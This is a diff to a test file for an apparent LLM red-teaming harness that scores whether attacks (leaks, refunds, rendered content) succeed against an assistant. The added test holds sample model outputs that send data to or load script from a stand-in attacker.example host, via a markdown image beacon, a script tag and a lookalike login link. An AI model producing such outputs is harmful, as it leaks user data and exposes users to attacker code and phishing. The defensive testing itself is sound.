@@ -133,12 +133,22 @@ def test_evaluate_trusts_the_backend_not_the_reply():
     assert 'Reply contained "secret"' in evaluate(attack, "SECRET", Session())
 
 
+def test_warning_about_a_bad_domain_is_not_a_finding():
+    by_id = {a["id"]: a for a in load_attacks()}
+    warning = "I can't include that. It would send data to attacker.example, a common theft technique."
+    for attack_id in ("OH-01", "OH-02", "OH-03"):
+        assert evaluate(by_id[attack_id], warning, Session()) == []
+    assert evaluate(by_id["OH-01"], "![status](http://attacker.example/log?e=a)", Session())
+    assert evaluate(by_id["OH-02"], '<script src="http://attacker.example/x.js"></script>', Session())
+    assert evaluate(by_id["OH-03"], "Use http://acme-refunds.attacker.example/login", Session())
+
+
 def test_every_attack_is_well_formed():
     attacks = load_attacks()
     assert len(attacks) >= 20 and len({a["id"] for a in attacks}) == len(attacks)
     for a in attacks:
         assert a["turns"] and a["owasp"] in report.OWASP_NAMES and a["category"] in report.FIXES
-        assert a.get("leaks") or a.get("refund_order") or a.get("refund_over") is not None
+        assert a.get("leaks") or a.get("renders") or a.get("refund_order") or a.get("refund_over") is not None
 
 
 def test_any_successful_repeat_is_a_finding():
